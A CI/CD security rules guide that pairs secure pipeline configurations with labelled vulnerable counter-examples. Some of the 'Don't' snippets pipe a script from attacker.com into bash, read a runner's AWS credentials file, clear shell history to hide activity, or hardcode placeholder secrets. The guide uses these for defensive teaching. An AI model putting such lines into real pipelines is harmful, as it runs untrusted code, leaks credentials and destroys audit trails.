# CI/CD Security Core Rules

This document provides foundational security rules for CI/CD pipelines that apply across all platforms and tools. These rules address supply chain security, secret management, pipeline integrity, and audit requirements.

---

## Rule: Secret Management - No Hardcoded Secrets

**Level**: `strict`

**When**: Any pipeline configuration, script, or code that handles credentials, API keys, tokens, or other sensitive data.

**Do**: Use dedicated secret management solutions with automatic rotation.

```yaml
# GitHub Actions - Using encrypted secrets
name: Deploy Application
on: [push]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to production
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          # Secrets are injected as environment variables
          ./deploy.sh
```

```yaml
# GitLab CI - Using CI/CD variables and Vault
deploy:
  stage: deploy
  script:
    - export DATABASE_URL="${DATABASE_URL}"
    - export API_KEY="${API_KEY}"
    - ./deploy.sh
  variables:
    VAULT_AUTH_ROLE: "gitlab-production"
  secrets:
    DATABASE_URL:
      vault: production/database/url@secrets
    API_KEY:
      vault: production/api/key@secrets
```

```yaml
# Azure DevOps - Using Azure Key Vault
trigger:
  - main

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: AzureKeyVault@2
    inputs:
      azureSubscription: 'Production-Connection'
      KeyVaultName: 'prod-secrets-vault'
      SecretsFilter: 'DATABASE-URL,API-KEY'
      RunAsPreJob: true

  - script: |
      ./deploy.sh
    env:
      DATABASE_URL: $(DATABASE-URL)
      API_KEY: $(API-KEY)
```

**Don't**: Hardcode secrets in pipeline configurations, scripts, or source code.

```yaml
# VULNERABLE: Hardcoded secrets in pipeline
name: Deploy Application
on: [push]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to production
        env:
          DATABASE_URL: "postgresql://admin:SuperSecret123@prod-db.example.com:5432/app"
          API_KEY: "sk-live-1234567890abcdef"
          AWS_ACCESS_KEY_ID: "AKIAIOSFODNN7EXAMPLE"
          AWS_SECRET_ACCESS_KEY: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        run: |
          ./deploy.sh
```

```yaml
# VULNERABLE: Secrets in script files
deploy:
  stage: deploy
  script:
    - export DATABASE_URL="postgresql://admin:password@db.example.com/app"
    - curl -H "Authorization: Bearer hardcoded-token-12345" https://api.example.com/deploy
```

**Why**: Hardcoded secrets in source control are a critical vulnerability. Once committed, secrets persist in git history even after deletion. Attackers who gain repository access immediately obtain production credentials. Automated scanners continuously search public repositories for exposed secrets, leading to rapid exploitation.

**Refs**:
- CWE-798: Use of Hard-coded Credentials
- CWE-259: Use of Hard-coded Password
- OWASP CI/CD Top 10: CICD-SEC-1 Insufficient Flow Control Mechanisms
- NIST SSDF PS.1: Protect All Forms of Code from Unauthorized Access and Tampering

---

## Rule: Secret Management - Secret Rotation

**Level**: `warning`

**When**: Configuring secret storage and access patterns for CI/CD pipelines.

**Do**: Implement automatic secret rotation with short-lived credentials.

```yaml
# GitHub Actions - OIDC for short-lived AWS credentials
name: Deploy with OIDC
on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          role-session-name: GitHubActions-${{ github.run_id }}
          aws-region: us-east-1
          # Credentials expire in 1 hour by default
```

```yaml
# GitLab CI - HashiCorp Vault with dynamic secrets
deploy:
  stage: deploy
  id_tokens:
    VAULT_ID_TOKEN:
      aud: https://vault.example.com
  secrets:
    DATABASE_PASSWORD:
      vault: database/creds/readonly/password@secrets
      # Dynamic credential generated on-demand, expires after use
  script:
    - export DATABASE_PASSWORD="${DATABASE_PASSWORD}"
    - ./deploy.sh
```

```hcl
# Terraform - Vault dynamic database credentials
data "vault_database_secret_backend_creds" "db" {
  backend = "database"
  name    = "readonly"
}

# Credentials are automatically rotated by Vault
# TTL is typically 1 hour, renewable up to max_ttl
```

**Don't**: Use long-lived static credentials without rotation policies.

```yaml
# VULNERABLE: Static credentials that never rotate
name: Deploy
on: [push]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          # Static IAM user credentials - never expire
          # If compromised, attacker has indefinite access
```

**Why**: Static, long-lived credentials provide attackers with persistent access if compromised. Short-lived credentials limit the window of exposure. Automatic rotation ensures credentials are regularly refreshed without manual intervention, reducing the risk of credential theft and abuse.

**Refs**:
- CWE-798: Use of Hard-coded Credentials
- NIST SP 800-63B: Digital Identity Guidelines
- SLSA v1.1 Build L3: Hardened build platform; provenance is non-forgeable
- OWASP CI/CD Top 10: CICD-SEC-2 Inadequate Identity and Access Management

---

## Rule: Pipeline as Code Security - Immutable Pipeline Definitions

**Level**: `strict`

**When**: Defining pipeline configurations that control build, test, and deployment processes.

**Do**: Store pipeline definitions in version control with branch protection.

```yaml
# GitHub Actions - Protected workflow in .github/workflows/
name: Production Deployment
on:
  push:
    branches: [main]
  workflow_dispatch:

# Require CODEOWNERS approval for workflow changes
# File: .github/CODEOWNERS
# .github/workflows/ @security-team @platform-team

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production  # Requires approval
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy
        run: ./deploy.sh
```

```yaml
# GitLab CI - Compliance pipeline that cannot be overridden
# File: .gitlab-ci.yml
include:
  - project: 'security/compliance-pipelines'
    ref: main
    file: '/templates/security-scanning.yml'

# compliance-pipelines/templates/security-scanning.yml
.security-scan:
  stage: security
  script:
    - run-security-scan
  rules:
    - when: always  # Cannot be skipped
  allow_failure: false
```

```yaml
# Azure DevOps - Required template
# azure-pipelines.yml
trigger:
  - main

extends:
  template: security/required-checks.yml@templates
  parameters:
    deployEnvironment: production

# templates/security/required-checks.yml
parameters:
  - name: deployEnvironment
    type: string

stages:
  - stage: SecurityScan
    jobs:
      - job: RequiredScans
        steps:
          - script: echo "Security scan - cannot be bypassed"
```

**Don't**: Allow pipeline definitions to be modified without review or use dynamic pipeline generation from untrusted sources.

```yaml
# VULNERABLE: Dynamic pipeline from user input
name: Build from PR
on:
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run custom build
        run: |
          # Attacker can modify build.sh in their PR
          chmod +x ./build.sh
          ./build.sh
```

```yaml
# VULNERABLE: Fetching pipeline from external source
deploy:
  stage: deploy
  script:
    - curl -s https://attacker.com/pipeline.sh | bash
```

**Why**: Pipeline as Code provides auditability and version control for CI/CD configurations. However, if attackers can modify pipeline definitions, they can inject malicious code, exfiltrate secrets, or deploy compromised artifacts. Branch protection and required reviews ensure changes are vetted before execution.

**Refs**:
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- SLSA v1.1 Build L2: Builds run on a hosted build platform that generates and signs provenance
- OWASP CI/CD Top 10: CICD-SEC-4 Poisoned Pipeline Execution (PPE)
- NIST SSDF PO.3: Implement Supporting Toolchains

---

## Rule: Artifact Integrity - Cryptographic Signing

**Level**: `strict`

**When**: Building, publishing, or consuming software artifacts (containers, packages, binaries).

**Do**: Sign all artifacts and verify signatures before use.

```yaml
# GitHub Actions - Sign container images with Sigstore/cosign
name: Build and Sign Container
on:
  push:
    branches: [main]

permissions:
  id-token: write
  packages: write
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Set up cosign
        uses: sigstore/cosign-installer@59acb6260d9c0ba8f4a2f9d9b48431a222b68e20

      - name: Build container
        run: |
          docker build -t ghcr.io/${{ github.repository }}:${{ github.sha }} .
          docker push ghcr.io/${{ github.repository }}:${{ github.sha }}

      - name: Sign container image
        run: |
          # As of cosign v2.0+ (Oct 2023), keyless signing with sigstore is the default — no env var needed.
          # The COSIGN_EXPERIMENTAL flag from v1.x is deprecated.
          cosign sign --yes ghcr.io/${{ github.repository }}:${{ github.sha }}
```

```yaml
# GitLab CI - Sign artifacts with GPG
build:
  stage: build
  script:
    - make build
    - sha256sum dist/* > dist/checksums.txt
    - gpg --armor --detach-sign dist/checksums.txt
  artifacts:
    paths:
      - dist/
      - dist/checksums.txt
      - dist/checksums.txt.asc
```

```yaml
# Verify signatures before deployment
deploy:
  stage: deploy
  script:
    # Verify cosign signature
    - cosign verify ghcr.io/myorg/myapp:$TAG

    # Verify GPG signature
    - gpg --verify dist/checksums.txt.asc dist/checksums.txt
    - sha256sum -c dist/checksums.txt

    # Deploy only if verification passes
    - ./deploy.sh
```

**Don't**: Distribute or consume artifacts without integrity verification.

```yaml
# VULNERABLE: No signature verification
deploy:
  stage: deploy
  script:
    # Pulling and running unverified container
    - docker pull registry.example.com/myapp:latest
    - docker run registry.example.com/myapp:latest

    # Downloading and running unverified binary
    - curl -O https://releases.example.com/app.tar.gz
    - tar xzf app.tar.gz
    - ./app
```

**Why**: Unsigned artifacts can be tampered with during transit or storage. Attackers who compromise artifact storage or network connections can inject malicious code. Cryptographic signatures provide assurance that artifacts originate from trusted sources and have not been modified.

**Refs**:
- CWE-494: Download of Code Without Integrity Check
- SLSA v1.1 Build L2: Builds run on a hosted build platform that generates and signs provenance
- SLSA v1.1 Build L3: Hardened build platform; provenance is non-forgeable
- NIST SSDF PS.3: Archive and Protect Each Software Release

---

## Rule: Artifact Integrity - Software Bill of Materials (SBOM)

**Level**: `warning`

**When**: Building software releases that will be distributed or deployed to production.

**Do**: Generate and publish SBOM with each release.

```yaml
# GitHub Actions - Generate SBOM
name: Build with SBOM
on:
  push:
    tags: ['v*']

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Generate SBOM for container
        uses: anchore/sbom-action@78fc58e266e87a38d4194b2137a3d4e9bcaf7ca1
        with:
          image: ghcr.io/${{ github.repository }}:${{ github.ref_name }}
          artifact-name: sbom-${{ github.ref_name }}.spdx.json
          output-file: sbom.spdx.json

      - name: Attest SBOM
        uses: actions/attest-sbom@v1
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.build.outputs.digest }}
          sbom-path: sbom.spdx.json
          push-to-registry: true
```

```yaml
# GitLab CI - Generate SBOM with syft
build:
  stage: build
  script:
    - make build
    - syft packages dir:./dist -o spdx-json > sbom.spdx.json
    - syft packages ./dist/myapp -o cyclonedx-json > sbom.cyclonedx.json
  artifacts:
    paths:
      - dist/
      - sbom.spdx.json
      - sbom.cyclonedx.json
```

```yaml
# CycloneDX for Node.js projects
build:
  stage: build
  script:
    - npm ci
    - npx @cyclonedx/cyclonedx-npm --output-file sbom.json
    - npm run build
  artifacts:
    paths:
      - dist/
      - sbom.json
```

**Don't**: Ship software without dependency transparency.

```yaml
# NO SBOM: Impossible to audit supply chain
build:
  stage: build
  script:
    - npm ci
    - npm run build
    - docker build -t myapp .
    - docker push myapp:latest
    # No SBOM generated - consumers cannot verify dependencies
```

**Why**: SBOMs provide transparency into software composition, enabling consumers to identify vulnerable components, license compliance issues, and supply chain risks. Without SBOMs, organizations cannot respond quickly to vulnerabilities like Log4Shell or track transitive dependencies.

**Refs**:
- NTIA Minimum Elements for SBOM
- SLSA v1.1 Build L1: Build process is documented and produces provenance
- Executive Order 14028: Improving the Nation's Cybersecurity
- NIST SSDF PS.3: Archive and Protect Each Software Release

---

## Rule: Artifact Integrity - Build Provenance Attestation

**Level**: `warning`

**When**: Publishing artifacts that will be consumed by other systems or users.

**Do**: Generate and publish provenance attestations for build artifacts.

```yaml
# GitHub Actions - SLSA provenance
name: SLSA Build
on:
  push:
    tags: ['v*']

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      hashes: ${{ steps.hash.outputs.hashes }}
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Build
        run: make build
      - name: Generate hashes
        id: hash
        run: |
          cd dist && sha256sum * > ../hashes.txt
          echo "hashes=$(base64 -w0 ../hashes.txt)" >> "$GITHUB_OUTPUT"
      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/

  provenance:
    needs: [build]
    permissions:
      actions: read
      id-token: write
      contents: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.9.0
    with:
      base64-subjects: "${{ needs.build.outputs.hashes }}"
```

```yaml
# Container provenance attestation
name: Container with Provenance
on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      packages: write
      attestations: write
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Build and push
        id: build
        uses: docker/build-push-action@v5
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}

      - name: Attest build provenance
        uses: actions/attest-build-provenance@v1
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
```

**Don't**: Publish artifacts without provenance information.

```yaml
# NO PROVENANCE: Cannot verify build origin
build:
  stage: build
  script:
    - make build
    - aws s3 cp dist/app.tar.gz s3://releases/
    # No attestation - consumers cannot verify this came from CI
```

**Why**: Provenance attestations provide cryptographic proof of how, when, and where an artifact was built. This enables consumers to verify artifacts were built from trusted source code using trusted build systems, preventing supply chain attacks where malicious artifacts are injected.

**Refs**:
- SLSA v1.1 Build L1: Build process is documented and produces provenance
- SLSA v1.1 Build L2: Builds run on a hosted build platform that generates and signs provenance
- SLSA v1.1 Build L3: Hardened build platform; provenance is non-forgeable
- in-toto Attestation Framework

---

## Rule: Supply Chain Security - Dependency Verification

**Level**: `strict`

**When**: Installing dependencies in CI/CD pipelines.

**Do**: Pin dependencies and verify their integrity.

```yaml
# GitHub Actions - Pin actions by SHA
name: Secure Build
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Pin by full SHA, not tag
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8  # v4.0.2
        with:
          node-version: '20'
          cache: 'npm'

      # Verify lockfile integrity
      - name: Install dependencies
        run: npm ci --ignore-scripts
```

```yaml
# GitLab CI - Dependency verification
build:
  stage: build
  script:
    # Python - verify hashes
    - pip install --require-hashes -r requirements.txt

    # Node.js - verify lockfile
    - npm ci --ignore-scripts

    # Go - verify checksums
    - go mod verify

    # Rust - verify Cargo.lock
    - cargo build --locked
```

```txt
# requirements.txt with hashes
requests==2.31.0 \
    --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f \
    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1
urllib3==2.0.7 \
    --hash=sha256:c97dfde1f7bd43a71c8d2a58e369e9b2bf692d1334ea9f9cae55add7d0dd0f84 \
    --hash=sha256:fdb6d215c776278489906c2f8916e6e7d4f5a9b602ccbcfdf7f016fc8da0596e
```

**Don't**: Install dependencies without integrity verification.

```yaml
# VULNERABLE: Unpinned dependencies
name: Build
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Tag can be moved
      - uses: actions/setup-node@latest  # Always latest

      - name: Install
        run: |
          npm install  # No lockfile verification
          pip install -r requirements.txt  # No hash verification
          curl -sSL https://install.example.com | bash  # Arbitrary code execution
```

**Why**: Unpinned dependencies can be modified by attackers through dependency confusion, typosquatting, or account compromise. Version tags can be moved to point to malicious code. Hash verification ensures the exact expected code is installed, preventing supply chain attacks.

**Refs**:
- CWE-829: Inclusion of Functionality from Untrusted Control Sphere
- SLSA v1.1 Build L3: Hardened build platform; provenance is non-forgeable
- OWASP CI/CD Top 10: CICD-SEC-3 Dependency Chain Abuse
- NIST SSDF PW.4: Review and Analyze Third-Party Components

---

## Rule: Supply Chain Security - Vulnerability Scanning

**Level**: `strict`

**When**: Building software with external dependencies.

**Do**: Scan dependencies for known vulnerabilities in every build.

```yaml
# GitHub Actions - Comprehensive vulnerability scanning
name: Security Scan
on:
  push:
    branches: [main]
  pull_request:
  schedule:
    - cron: '0 6 * * *'  # Daily scan

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      # Dependency review for PRs
      - name: Dependency Review
        if: github.event_name == 'pull_request'
        uses: actions/dependency-review-action@9129d7d40b8c12c1ed0f60f46571c66571c90571
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0

      # SAST scanning
      - name: CodeQL Analysis
        uses: github/codeql-action/analyze@v3

      # Container scanning
      - name: Trivy Container Scan
        uses: aquasecurity/trivy-action@0.16.0
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'
```

```yaml
# GitLab CI - Security scanning templates
include:
  - template: Security/SAST.gitlab-ci.yml
  - template: Security/Secret-Detection.gitlab-ci.yml
  - template: Security/Dependency-Scanning.gitlab-ci.yml
  - template: Security/Container-Scanning.gitlab-ci.yml

variables:
  SAST_EXCLUDED_ANALYZERS: ""
  DS_EXCLUDED_ANALYZERS: ""
  SECURE_LOG_LEVEL: "debug"

# Custom scanning job
dependency_scan:
  stage: test
  script:
    - npm audit --audit-level=high
    - pip-audit -r requirements.txt
    - trivy fs --severity HIGH,CRITICAL --exit-code 1 .
  allow_failure: false
```

**Don't**: Skip vulnerability scanning or ignore findings.

```yaml
# VULNERABLE: No security scanning
build:
  stage: build
  script:
    - npm install
    - npm run build
    # No vulnerability scanning - shipping vulnerable dependencies

# VULNERABLE: Ignoring scan results
security_scan:
  stage: test
  script:
    - npm audit || true  # Always passes
    - trivy fs . || true  # Ignoring all findings
  allow_failure: true  # Never blocks pipeline
```

**Why**: Dependencies frequently contain known vulnerabilities. Without scanning, vulnerable components are shipped to production, creating exploitable attack vectors. Continuous scanning ensures vulnerabilities are detected before deployment and tracked over time.

**Refs**:
- CWE-1035: Using Components with Known Vulnerabilities
- OWASP A06:2025: Vulnerable and Outdated Components
- OWASP CI/CD Top 10: CICD-SEC-3 Dependency Chain Abuse
- NIST SSDF PW.4: Review and Analyze Third-Party Components

---

## Rule: Supply Chain Security - Minimal Base Images

**Level**: `warning`

**When**: Building container images for deployment.

**Do**: Use minimal, hardened base images with known provenance.

```dockerfile
# Secure: Minimal distroless image
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM gcr.io/distroless/nodejs20-debian12:nonroot
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/dist ./dist
USER nonroot:nonroot
CMD ["dist/index.js"]
```

```dockerfile
# Secure: Pinned base image with digest
FROM python:3.12-slim@sha256:a3e58f9399353be051735f09be0316bfdeab571a5c6a24fd78b92df85bcb2d85
RUN apt-get update && apt-get install -y --no-install-recommends \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/* \
    && useradd -r -s /bin/false appuser
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY --chown=appuser:appuser . .
USER appuser
CMD ["python", "app.py"]
```

```yaml
# GitLab CI - Verify base image before build
build:
  stage: build
  script:
    # Verify base image signature
    - cosign verify gcr.io/distroless/static-debian12:nonroot

    # Build with verified base
    - docker build -t myapp:$CI_COMMIT_SHA .

    # Scan the built image
    - trivy image --severity HIGH,CRITICAL myapp:$CI_COMMIT_SHA
```

**Don't**: Use large, unverified base images.

```dockerfile
# VULNERABLE: Large attack surface
FROM ubuntu:latest
RUN apt-get update && apt-get install -y \
    curl wget vim nano gcc make python3 nodejs \
    openssh-server telnet netcat nmap
COPY . /app
CMD ["/app/start.sh"]
```

```dockerfile
# VULNERABLE: Running as root
FROM node:20
WORKDIR /app
COPY . .
RUN npm install
# Running as root with full filesystem access
CMD ["node", "index.js"]
```

**Why**: Large base images contain unnecessary packages that increase attack surface. Each additional package is a potential vulnerability. Minimal images (distroless, alpine) contain only runtime requirements, reducing vulnerabilities and attack vectors. Running as non-root limits damage from container escapes.

**Refs**:
- CWE-250: Execution with Unnecessary Privileges
- CIS Docker Benchmark
- NIST SP 800-190: Application Container Security Guide
- OWASP Docker Security Cheat Sheet

---

## Rule: Audit Logging - Pipeline Execution Logs

**Level**: `strict`

**When**: Configuring CI/CD systems and executing pipelines.

**Do**: Enable comprehensive audit logging for all pipeline activities.

```yaml
# GitHub Actions - Audit log configuration
# Organization Settings > Audit log
# Enable: Log all events, Export to SIEM

name: Secure Pipeline
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Log pipeline metadata
        run: |
          echo "::notice::Pipeline execution started"
          echo "Repository: $GITHUB_REPOSITORY"
          echo "Commit: $GITHUB_SHA"
          echo "Actor: $GITHUB_ACTOR"
          echo "Event: $GITHUB_EVENT_NAME"
          echo "Ref: $GITHUB_REF"
          echo "Run ID: $GITHUB_RUN_ID"
          echo "Run Number: $GITHUB_RUN_NUMBER"
```

```yaml
# GitLab CI - Audit configuration
# Admin > Settings > Audit Events
# Enable streaming to external destination

variables:
  CI_DEBUG_TRACE: "false"  # Only enable for debugging

audit_record:
  stage: .pre
  script:
    - echo "Pipeline started"
    - echo "Project: ${CI_PROJECT_PATH}"
    - echo "Commit: ${CI_COMMIT_SHA}"
    - echo "User: ${GITLAB_USER_LOGIN}"
    - echo "Pipeline ID: ${CI_PIPELINE_ID}"
    - echo "Source: ${CI_PIPELINE_SOURCE}"
```

```yaml
# Azure DevOps - Audit streaming
# Organization Settings > Auditing
# Set up audit streams to:
# - Azure Monitor Logs
# - Splunk
# - Azure Event Grid

steps:
  - script: |
      echo "##[section]Audit Trail"
      echo "Build ID: $(Build.BuildId)"
      echo "Requested By: $(Build.RequestedFor)"
      echo "Source Branch: $(Build.SourceBranch)"
      echo "Repository: $(Build.Repository.Name)"
    displayName: 'Log Pipeline Metadata'
```

**Don't**: Disable audit logging or allow logs to be modified.

```yaml
# VULNERABLE: Disabled audit logging
variables:
  CI_DEBUG_TRACE: "false"
  # No audit configuration
  # Logs deleted after 30 days
  # No external streaming

build:
  script:
    # Clearing logs to hide activity
    - rm -rf ~/.bash_history
    - history -c
```

**Why**: Audit logs provide visibility into pipeline activities, enabling detection of unauthorized changes, secret access, and malicious behavior. Without comprehensive logging, security incidents cannot be investigated, and compliance requirements cannot be met. Logs must be immutable and retained for investigation.

**Refs**:
- CWE-778: Insufficient Logging
- OWASP CI/CD Top 10: CICD-SEC-10 Insufficient Logging and Visibility
- SOC 2 Type II: CC7.2 System Operations
- NIST SSDF RV.2: Assess, Prioritize, and Remediate Vulnerabilities

---

## Rule: Audit Logging - Secret Access Logging

**Level**: `strict`

**When**: Accessing secrets in CI/CD pipelines.

**Do**: Log all secret access with appropriate metadata (without exposing secret values).

```yaml
# HashiCorp Vault - Audit device configuration
vault audit enable file file_path=/var/log/vault/audit.log

# Vault policy with audit
path "secret/data/production/*" {
  capabilities = ["read"]
  # All reads are logged with:
  # - Timestamp
  # - Client token (not secret value)
  # - Request path
  # - Source IP
  # - Request ID
}
```

```yaml
# AWS Secrets Manager - CloudTrail logging
# CloudTrail automatically logs:
# - GetSecretValue calls
# - IAM identity
# - Source IP
# - Request time

# GitHub Actions with AWS
- name: Get secret with audit
  run: |
    # This call is logged in CloudTrail
    aws secretsmanager get-secret-value \
      --secret-id production/database \
      --query SecretString \
      --output text
```

```yaml
# GitLab CI - Variable audit events
# Audit events logged for:
# - Variable creation/modification
# - Variable access in pipelines
# - Protected variable exposure

deploy:
  script:
    # Access logged in GitLab audit log
    - echo "Accessing secret for deployment"
    - ./deploy.sh
  variables:
    DATABASE_URL: $DATABASE_URL  # Access logged
```

**Don't**: Allow secret access without audit trails.

```yaml
# VULNERABLE: Unaudited secret access
build:
  script:
    # Hardcoded secrets - no audit trail
    - export API_KEY="sk-1234567890"

    # Fetching from non-audited source
    - curl -s http://internal-config/secrets.json > secrets.json
    - export $(jq -r '.env | to_entries | .[] | "\(.key)=\(.value)"' secrets.json)
```

**Why**: Secret access must be logged to detect unauthorized access, investigate breaches, and maintain compliance. Without audit trails, it's impossible to determine if secrets were accessed inappropriately or when credential rotation is needed after potential exposure.

**Refs**:
- CWE-778: Insufficient Logging
- CWE-532: Information Exposure Through Log Files (for what NOT to log)
- PCI DSS 10.2: Implement Automated Audit Trails
- NIST SP 800-53 AU-2: Audit Events

---

## Rule: Pipeline Isolation - Environment Separation

**Level**: `strict`

**When**: Configuring CI/CD pipelines that deploy to multiple environments.

**Do**: Enforce strict isolation between environments with separate credentials and protection rules.

```yaml
# GitHub Actions - Environment protection
name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy to staging
        env:
          DATABASE_URL: ${{ secrets.STAGING_DATABASE_URL }}
          API_KEY: ${{ secrets.STAGING_API_KEY }}
        run: ./deploy.sh staging

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    # Production environment requires:
    # - Required reviewers
    # - Wait timer
    # - Branch restrictions
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy to production
        env:
          DATABASE_URL: ${{ secrets.PROD_DATABASE_URL }}
          API_KEY: ${{ secrets.PROD_API_KEY }}
        run: ./deploy.sh production
```

```yaml
# GitLab CI - Environment tiers
stages:
  - build
  - test
  - deploy_staging
  - deploy_production

deploy_staging:
  stage: deploy_staging
  environment:
    name: staging
    url: https://staging.example.com
  variables:
    DATABASE_URL: $STAGING_DATABASE_URL
  script:
    - ./deploy.sh
  only:
    - main

deploy_production:
  stage: deploy_production
  environment:
    name: production
    url: https://app.example.com
  variables:
    DATABASE_URL: $PROD_DATABASE_URL  # Protected variable
  script:
    - ./deploy.sh
  only:
    - main
  when: manual  # Requires manual trigger
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
      when: manual
```

**Don't**: Share credentials between environments or allow unrestricted production access.

```yaml
# VULNERABLE: Shared credentials
variables:
  DATABASE_URL: $DATABASE_URL  # Same for all environments

deploy_staging:
  script:
    - ./deploy.sh staging

deploy_production:
  script:
    # Uses same credentials as staging
    - ./deploy.sh production
```

```yaml
# VULNERABLE: No production protection
deploy_production:
  script:
    - ./deploy.sh production
  # No manual approval
  # No branch restrictions
  # Any pipeline can deploy
```

**Why**: Environment isolation prevents lateral movement if one environment is compromised. Staging environments often have weaker security and more users with access. Sharing credentials means staging compromise leads to production access. Protection rules ensure production changes are reviewed and approved.

**Refs**:
- CWE-269: Improper Privilege Management
- OWASP CI/CD Top 10: CICD-SEC-1 Insufficient Flow Control Mechanisms
- NIST SSDF PO.5: Implement and Maintain Secure Environments
- SOC 2 CC6.1: Logical and Physical Access Controls

---

## Rule: Pipeline Isolation - Runner Security

**Level**: `strict`

**When**: Configuring CI/CD runners (agents) for pipeline execution.

**Do**: Isolate runners by security domain and implement least privilege.

```yaml
# GitHub Actions - Isolated self-hosted runners
name: Secure Build
on: [push]

jobs:
  # Untrusted code (PRs from forks) runs on ephemeral runners
  test-pr:
    if: github.event_name == 'pull_request' && github.event.pull_request.head.repo.fork
    runs-on: ubuntu-latest  # GitHub-hosted, ephemeral
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test

  # Trusted code runs on self-hosted with access to secrets
  deploy:
    if: github.ref == 'refs/heads/main'
    runs-on: [self-hosted, production]  # Dedicated production runner
    environment: production
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy
        run: ./deploy.sh
```

```yaml
# GitLab CI - Runner tags for isolation
# Register runners with specific tags:
# gitlab-runner register --tag-list "production,secure" --locked

build:
  stage: build
  tags:
    - docker
    - shared
  script:
    - npm run build

deploy_production:
  stage: deploy
  tags:
    - production  # Dedicated production runner
    - secure
  script:
    - ./deploy.sh
  environment: production
```

```hcl
# Terraform - Ephemeral runners on Kubernetes
resource "kubernetes_deployment" "github_runner" {
  metadata {
    name = "github-runner"
  }
  spec {
    template {
      spec {
        # Non-root, read-only filesystem
        security_context {
          run_as_non_root = true
          run_as_user     = 1000
          fs_group        = 1000
        }
        container {
          name  = "runner"
          image = "ghcr.io/actions/actions-runner:latest"
          security_context {
            allow_privilege_escalation = false
            read_only_root_filesystem  = true
            capabilities {
              drop = ["ALL"]
            }
          }
        }
        # Pod deleted after job completion
        restart_policy = "Never"
      }
    }
  }
}
```

**Don't**: Run untrusted code on runners with access to production secrets.

```yaml
# VULNERABLE: No runner isolation
jobs:
  build:
    runs-on: [self-hosted]  # All jobs on same runner
    steps:
      - uses: actions/checkout@v4
      # PR from fork can access same runner as production deploy
      # May have access to cached secrets, tokens, etc.
```

```yaml
# VULNERABLE: Persistent runners without cleanup
# Self-hosted runner that persists between jobs
# Previous job artifacts, secrets may be accessible
build:
  tags:
    - shared-runner
  script:
    - cat /home/runner/.aws/credentials  # May exist from previous job
```

